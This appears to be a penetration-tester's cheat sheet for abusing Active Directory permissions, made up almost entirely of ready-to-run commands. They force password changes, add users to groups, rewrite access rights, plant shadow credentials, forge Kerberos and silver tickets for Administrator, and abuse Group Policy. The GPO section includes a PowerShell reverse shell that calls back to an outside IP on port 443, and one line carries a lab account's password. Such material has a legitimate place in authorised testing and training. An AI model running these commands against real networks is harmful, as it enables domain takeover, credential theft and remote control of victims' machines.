# ACL

{% code overflow="wrap" fullWidth="true" %}
```bash
# ACL overview on BloodHound
MATCH p=(u)-[r1]->(n) WHERE r1.isacl=true and not tolower(u.name) contains 'vagrant' and u.admincount=false and not tolower(u.name) contains 'key' RETURN p

# ForceChangePassword over a user
net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
# GenericWrite over a user -> Targeted Kerberoasting (add SPN and becomes vulnerable to Kerberoasting)
targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'

# WriteDACL over a user -> grant yourself GenericAll and then Targeted Kerberoast, Force Change Password or Shadow Credentials attack (below the last one)
dacledit.py -action 'write' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'
# Now Shadow Credentials using Certipy (if target is a computer, end with $)
certipy shadow auto -u 'user'@'domain' -p 'password' -account 'target_user_or_computer' 

# AddSelf over a group (user:pass or using PTH)
net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
pth-net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"
# Finally verify user was successfully added
net rpc group members "TargetGroup" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"

# AddSelf -> user over a group / Find distinguished name of both user and the target group
ldeep ldap -u $USER -H ':$NT_HASH' -d domain.local -s ldap://$IP search '(sAMAccountName=$USER)' distinguishedName
ldeep ldap -u $USER -H ':$NT_HASH' -d domain.local -s ldap://$IP search '(sAMAccountName=Target Group)' distinguishedName
# Add the user to the target group
ldeep ldap -u $USER -H ':$NT_HASH' -d domain.local -s ldap://$IP add_to_group "DISTINGUISHED_NAME_USER" "DISTINGUISHED_NAME_TARGET_GROUP"
# See the result
ldeep ldap -u $USER -H ':$NT_HASH' -d domain.local -s ldap://$IP membersof 'Target Group'

# AddMember of a group over another group (members of a group can add other principals, including themselves, to another group)
--- Do the same as before with AddSelf

# WriteOwner over a group -> members of a group can modify owner of another group (owneredit.py from 
owneredit.py -action write -owner 'attacker' -target 'victim' 'DOMAIN'/'USER':'PASSWORD'
# Now we are the owner, grant yourself GenericAll privileges
dacledit.py -action 'write' -rights 'GenericAll' -principal 'controlledUser' -target 'Target Group' 'domain'/'controlledUser' -hashes ':$NT_HASH'
# And add yourself to that group
ldeep ldap -u $USER -H ':$NT_HASH' -d domain.local -s ldap://$IP add_to_group "DISTINGUISHED_NAME_USER" "DISTINGUISHED_NAME_TARGET_GROUP"
# See the result
ldeep ldap -u $USER -H ':$NT_HASH' -d domain.local -s ldap://$IP membersof 'Target Group'

# Generic all of a group over a user -> members of that group have GenericAll over a user and can ForceChangePassword, Targeted Kerberoasting or Shadow Credentials
net rpc password "TargetUser" "newP@ssword2022" --pw-nt-hash -U "DOMAIN"/"ControlledUser%$NT_HASH" -S "DomainController"

# GenericAll of a user over a computer -> RCBD (Resourced-Based Constrained Delegation) is an option but option for a user to add computers is usually disabled nowadays
# Alternative is Shadow Credential Attack with certipy for example
certipy shadow auto -u 'user'@'domain' -p 'password' -account 'target_user_or_computer'
# Now if the computer is a DC we could try DCSync or getting a shell  using s4u2self abuse or create a silver ticket
# s4u2self abuse : we ask for a TGS as the Administrator domain user
export KRB5CCNAME=computer.ccache 
getST.py -self -impersonate Administrator -altservice "cifs/dc.domain.local" -k -no-pass -dc-ip $DC_IP 'domain.local'/'computer$'
# Now use the TGT to get a shell
export KRB5CCNAME=Administrator@cifs_dc.domain.local@DOMAIN.LOCAL.ccache
wmiexec.py -k -no-pass domain.local/administrator@dc.domain.local
# Another way to get a shell is by creating a silver ticket; first get the domain SID
lookupsid.py -hashes ':$NT_HASH' 'domain.local'/'computer$'@dc.domain.local 0
# Create the silver ticket
ticketer.py -nthash '$NT_HASH' -domain-sid 'S-1-5-...' -domain domain.local -spn cifs/dc.domain.local Administrator
# And use it
export KRB5CCNAME=Administrator@cifs_dc.domain.local@DOMAIN.LOCAL.ccache
wmiexec.py -k -no-pass domain.local/administrator@dc.domain.local

# AllowedToAct
https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd#practice
We need to use creds from a user with SPN set. We can impersonate always Administrator user or any user not included in the Protected Users group.
# NOTE:
-spn 'cifs/target' # SPN can be cifs/whatever but -spn parameter has to be cifs/dc01.domain.com for example:
impacket-getST -spn 'cifs/dc01.vintage.htb' -impersonate l.bianchi_adm vintage.htb/svc_sql:Zer0the0ne -dc-ip $IP -k                                                  
```
{% endcode %}

## Shadow Credentials

<pre class="language-sh" data-overflow="wrap" data-full-width="true"><code class="lang-sh">Whisker.exe
 https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab?gi=90322daff4fc
 
https://github.com/ShutdownRepo/pywhisker 
<strong>pywhisker.py --action list -d dom.com -u $USER -p $PASS --dc-ip $DC_IP -t $TARGET_IP (--use-ldaps)
</strong><strong># If pyOpenSSL error try
</strong><strong>https://github.com/fortra/impacket/issues/1716#issuecomment-2478010071
</strong>Full steps here https://github.com/ShutdownRepo/pywhisker?tab=readme-ov-file#add-new-values
</code></pre>

## GPO Abuse

{% code overflow="wrap" fullWidth="true" %}
```bash
Get-NetGPO
Get-GPO -all | where {-not $_.description} | select displayname, description
Get-GPO -Name "Default Domain Policy"
Get-GPPermission -Guid $GPO_ID -TargetType User -TargetName $OUR_USER
Get-DomainGPO -Domain testlab.local
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount myuser --GPOName $VULNERABLE_GPO
gpudate /force

https://github.com/Hackndo/pyGPOAbuse
# We have to wait few minutes for the scheduled task
# Get GPO_ID aka the vulnerable GPO from Bloodhound (is found between {}  in GPO File Path vparameter or distinguishedname)
pygpoabuse.py DOMAIN/user(:password) -hashes lm:nt -gpo-id "$GPO_ID" # this will add john user to local administrators group (Password: H4x00r123..) 
# To get a shell 
pygpoabuse.py DOMAIN/user:password -gpo-id "$GPO_ID" -powershell -command "\$c = New-Object System.Net.Sockets.TCPClient('192.168.56.126',443);\$s = \$c.GetStream();[byte[]]\$b = 0..65535|%{0};while((\$i = \$s.Read(\$b, 0, \$b.Length)) -ne 0){    \$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0, \$i);    \$sb = (iex \$d 2>&1 | Out-String );    \$sb = ([text.encoding]::ASCII).GetBytes(\$sb + 'ps> ');    \$s.Write(\$sb,0,\$sb.Length);    \$s.Flush()};\$c.Close()" -taskname "MyTask2" -description "don't worry"
# NOTE: pyGPOAbuse is changing the GPO without going back ! Do not use in production or at your own risk and do not forget to cleanup after
# Cleanup: go to Scheduled Tasks and delete the ones we created
```
{% endcode %}

## Read LAPS Password

The attacker can then read the LAPS password of the computer account (i.e. the password of the computer's local administrator)

```bash
nxc ldap $IP -d domain.local -u $USER -p '$PASS' --module laps
```

## Resources

{% code overflow="wrap" fullWidth="true" %}
```bash
    https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces
    https://www.thehacker.recipes/ad/movement/dacl
    https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/acl-abuse
    https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab
```
{% endcode %}

